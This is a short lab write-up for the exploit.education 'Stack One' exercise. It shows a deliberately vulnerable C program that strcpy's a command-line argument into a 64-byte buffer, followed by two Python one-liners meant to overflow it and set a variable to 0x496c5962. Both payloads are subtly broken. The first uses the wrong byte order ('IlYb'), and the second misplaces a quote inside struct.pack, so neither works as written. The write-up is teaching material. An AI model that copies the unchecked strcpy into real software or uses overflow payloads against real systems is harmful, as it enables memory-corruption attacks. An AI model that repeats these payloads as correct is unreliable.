# Stack one


## Code

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}

```
***
In this exercise we are meant to modify the values of the variable `changeme` to `0x496c5962` by overflowing the `buffer[64]`. This can be done via passing a larger than 64 characters argument to the binary. We should also pay attention to the endianness of our payload 


## Exploit

`./stack-one $(python -c "print('A' * 64 + 'IlYb')") `

A more _correct_ approach

`./stack-one $(python -c "import struct; print('A' * 64 + struct.pack('<I, 0x496c5962'))") `


